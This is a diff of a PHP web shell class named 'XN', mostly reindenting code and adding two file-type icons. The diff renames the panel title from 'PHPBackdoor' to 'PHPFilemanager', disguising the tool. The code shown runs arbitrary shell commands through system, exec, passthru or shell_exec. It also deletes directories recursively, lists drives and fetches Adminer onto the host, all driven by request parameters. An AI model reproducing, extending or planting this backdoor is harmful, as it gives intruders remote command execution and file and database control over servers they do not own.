@@ -66,7 +66,7 @@ class XN
         $perms = @fileperms($filename);
         switch ($perms & 0xf000)
         {
-        	case 0xc000:$info = 's';break;
+            case 0xc000:$info = 's';break;
             case 0xa000:$info = 'l';break;
             case 0x8000:$info = 'r';break;
             case 0x6000:$info = 'b';break;
@@ -116,11 +116,13 @@ class XN
             case 'mp4':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg');break;
             case 'log':
             case 'log1':
+            case 'psd':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306166.svg');break;
             case 'log2':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg');break;
             case 'dat':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg');break;
             case 'exe':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg');break;
             case 'apk':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg');break;
             case 'yaml':self::vers('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');break;
+            case 'xlsx':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306200.svg');break;
             case 'bak':self::vers('https://image.flaticon.com/icons/svg/2125/2125736.svg');break;
             case 'ico':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306102.svg');break;
             case 'png':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg');break;
@@ -149,10 +151,22 @@ class XN
     }
     public static function exe($cmd)
     {
-        if (function_exists('system')) {@ob_start();@system($cmd);$buff = @ob_get_contents();@ob_end_clean();return $buff;}
-        elseif(function_exists('exec')){@exec($cmd, $results);$buff = "";foreach($results as $result){$buff.=$result;}return$buff;}
-        elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$buff=@ob_get_contents();@ob_end_clean();return $buff;}
-        elseif(function_exists('shell_exec')){$buff=@shell_exec($cmd);return$buff;}
+        if (function_exists('system')) 
+            {
+                @ob_start();@system($cmd);$buff=@ob_get_contents();@ob_end_clean();return $buff;
+            }
+        elseif(function_exists('exec'))
+            {
+                @exec($cmd,$results);$buff="";foreach($results as $result){$buff.=$result;}return$buff;
+            }
+        elseif(function_exists('passthru'))
+            {
+                @ob_start();@passthru($cmd);$buff=@ob_get_contents();@ob_end_clean();return$buff;
+            }
+        elseif(function_exists('shell_exec'))
+            {
+                $buff=@shell_exec($cmd);return$buff;
+            }
     }
     public static function color($bold = 1, $colorid = null, $string = null)
     {
@@ -209,7 +223,7 @@ class XN
             foreach ($scandir as $object) {
                 if ($object!='.'&&$object!='..') {
                     if (is_dir($filename.DIRECTORY_SEPARATOR.$object))
-                    	{self::delete($filename.DIRECTORY_SEPARATOR.$object);}
+                        {self::delete($filename.DIRECTORY_SEPARATOR.$object);}
                         else{@unlink($filename.DIRECTORY_SEPARATOR.$object);}
                 }
             }
@@ -223,10 +237,10 @@ class XN
     public static function owner($filename)
     {
         if (function_exists("posix_getpwuid"))
-        	{self::$owner=@posix_getpwuid(fileowner($filename));self::$owner=self::$owner['name'];}
+            {self::$owner=@posix_getpwuid(fileowner($filename));self::$owner=self::$owner['name'];}
         else{self::$owner=fileowner($filename);}
         if (function_exists("posix_getgrgid"))
-        	{self::$group=@posix_getgrgid(filegroup($filename));self::$group=self::$group['name'];}
+            {self::$group=@posix_getgrgid(filegroup($filename));self::$group=self::$group['name'];}
         else {self::$group=filegroup($filename);}
         return self::$owner."<span class='group'>/".self::$group."</span>";
     }
@@ -292,7 +306,10 @@ class XN
             }
         }
     }
-    public static function replace($filename){return str_replace([' ', '.', ':', '-', '(', ')'], '', $filename);}
+    public static function replace($filename)
+    {
+        return str_replace([' ', '.', ':', '-', '(', ')'], '', $filename);
+    }
     public static function formatSize($bytes)
     {
         $types = ['Byte', 'KB', 'MB', 'GB', 'TB'];
@@ -308,26 +325,26 @@ class XN
         }
     }
     static public function disk($path) {
-	$letters="";$v=explode("\\",$path);$v=$v[0];
-	 foreach(range("A","Z")as$letter) {
-	  	$bool=$isdiskette=in_array($letter,array("A"));
-	  	if(!$bool)$bool=is_dir("{$letter}:\\");
-	  	if($bool) {
-	   		$letters.="<a href='?x={$letter}:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
-	   		if($letter.":"!=$v){$letters.="<div class='diskk'><div class='img'><img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828703.svg'></div><div class='letter'>{$letter}</div> </div>";}
-	   		else {$letters.="<div class='usb'><div class='img'><img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828650.svg'></div><div class='letter'>{$letter}</div></div>";}
-	   		$letters .= "</a>";
-	  	}
-	}
-	if(!empty($letters)) { ?>
-		<table class="disk" width="100%">
-			<tr>
-				<td>Detected Drives</td>
-				<td>:</td>
-				<td><?= $letters ?></td>
-			</tr>
-		</table>
-	<?php }
+    $letters="";$v=explode("\\",$path);$v=$v[0];
+     foreach(range("A","Z")as$letter) {
+        $bool=$isdiskette=in_array($letter,array("A"));
+        if(!$bool)$bool=is_dir("{$letter}:\\");
+        if($bool) {
+            $letters.="<a href='?x={$letter}:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
+            if($letter.":"!=$v){$letters.="<div class='diskk'><div class='img'><img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828703.svg'></div><div class='letter'>{$letter}</div> </div>";}
+            else {$letters.="<div class='usb'><div class='img'><img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828650.svg'></div><div class='letter'>{$letter}</div></div>";}
+            $letters .= "</a>";
+        }
+    }
+    if(!empty($letters)) { ?>
+        <table class="disk" width="100%">
+            <tr>
+                <td>Detected Drives</td>
+                <td>:</td>
+                <td><?= $letters ?></td>
+            </tr>
+        </table>
+    <?php }
 }
 }
 if (isset($_GET['x'])){XN::cd($_GET['x']);}
@@ -679,49 +696,49 @@ function alert($message)
         border-bottom-right-radius:5px;
     }
     .disk {
-    	
+        
     }
     .disk,
     .pwdd {
-    	padding-bottom:10px;
-    	padding-top:10px;
+        padding-bottom:10px;
+        padding-top:10px;
     }
     .usb,
     .diskk {
-    	width:6%;
-    	padding:5px;
-    	display: inline-block;
-    	margin-right:5px;
+        width:6%;
+        padding:5px;
+        display: inline-block;
+        margin-right:5px;
     }
     .usb .img,
     .diskk .img {
-    	text-align: center;
-    	width:20px;
-    	height:20px;
-    	display: inline-block;
+        text-align: center;
+        width:20px;
+        height:20px;
+        display: inline-block;
     }
     .usb .img img,
     .diskk .img img {
-    	width:15px;
-    	margin:2.5px;
-    	height:15px;
+        width:15px;
+        margin:2.5px;
+        height:15px;
     }
     .usb .letter,
     .diskk .letter {
-    	margin:0px;
-    	position: absolute;
-    	display: inline-block;
+        margin:0px;
+        position: absolute;
+        display: inline-block;
     }
     table.disk {
-    	border-collapse: collapse;
-    	border-spacing:0;
+        border-collapse: collapse;
+        border-spacing:0;
     }
     table.disk td:first-child {
-    	width:130px;
+        width:130px;
     }
     table.disk td:nth-child(2) {
-    	width:10px;
-    	text-align: center;
+        width:10px;
+        text-align: center;
     }
     table.disk td:nth-child(3) {
     }
@@ -1111,12 +1128,12 @@ function alert($message)
         text-align: left;
     }
     .nothing {
-    	background: rgba(255, 0, 0, 0.2);
-    	color: rgba(255, 0, 0, 0.6);
-    	border-radius:15px;
-    	padding:15px;
-    	text-align: center;
-    	font-style: italic;
+        background: rgba(255, 0, 0, 0.2);
+        color: rgba(255, 0, 0, 0.6);
+        border-radius:15px;
+        padding:15px;
+        text-align: center;
+        font-style: italic;
     }
     @media (min-width: 320px) and (max-width: 480px) {
         body {
@@ -1134,8 +1151,8 @@ function alert($message)
             height:68%;
         }
         .modal {
-        	min-width:200px;
-        	max-width:500px;
+            min-width:200px;
+            max-width:500px;
         }
         .files {
             box-shadow: none;
@@ -1167,12 +1184,12 @@ function alert($message)
             width: 100%;
         }
         .usb,
-    	.diskk {
-    		width:20%;
-    		padding:5px;
-    		display: inline-block;
-    		margin-right:5px;
-    	}
+        .diskk {
+            width:20%;
+            padding:5px;
+            display: inline-block;
+            margin-right:5px;
+        }
         .group {
             display: none;
         }
@@ -1236,12 +1253,12 @@ function filterTable() {
     tr=table.getElementsByTagName("tr");
     for(i=0;i<tr.length;i++){td=tr[i].getElementsByTagName("td")[0];
         if(td){if(td.innerHTML.toUpperCase().indexOf(filter)>-1){tr[i].style.display="";}
-    	else{tr[i].style.display="none";}}}
+        else{tr[i].style.display="none";}}}
 }
 </script>
 <script type="text/javascript">
- 	$(document).ready(function(){$(".open").on("click",function(){$(".container").fadeIn();$(".open").fadeOut();});
- 	$(".close").on("click",function(){$(".container").fadeOut();$(".open").fadeIn();});});
+    $(document).ready(function(){$(".open").on("click",function(){$(".container").fadeIn();$(".open").fadeOut();});
+    $(".close").on("click",function(){$(".container").fadeOut();$(".open").fadeIn();});});
 </script>
 <script type="text/javascript">
     jqxAlert = {top: 0,left: 0,overlayOpacity: 0.2,overlayColor: 'rgba(0, 0, 0, 0.3)',
@@ -1331,12 +1348,12 @@ function filterTable() {
             else {alert("".basename($_POST['file'])." has been backup !");}
             break;
         case 'adminer':
-        	head('Adminer', getcwd(), 'hidden');
+            head('Adminer', getcwd(), 'hidden');
             if (file_exists('adminer.php')) { ?>
                 <div class="adminer"><a href="adminer.php" target="_blank">Login Adminer</a></div>
                 <?php } 
                 else { 
-                	if (XN::adminer('https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php','adminer.php')) { ?>
+                    if (XN::adminer('https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php','adminer.php')) { ?>
                     <div class="adminer">
                         <span>
                             Successfully created Adminer.php
@@ -1575,20 +1592,20 @@ function filterTable() {
     ?>
     <div class="storage">
         <span class="title">
-            PHPBackdoor
+            PHPFilemanager
         </span>
         <br><span>Total : <?= XN::hdd('total') ?></span> <span>|</span>
         <span>Free : <?= XN::hdd('free') ?></span> <span>|</span>
         <span>Used : <?= XN::hdd('used') ?></span>
         <div>
-        	<?= XN::disk(getcwd()) ?>
+            <?= XN::disk(getcwd()) ?>
         </div>
     </div>
     <div class="table">
     <table id="myTable">
         <?php
         if (!XN::countDir(getcwd())){alert("Not files in here");?><div class="nothing">Not files in here</div>
-    	<?php }
+        <?php }
         foreach (XN::files('dir') as $dir) { ?>
             <tr>
                 <td class="border1 hover">
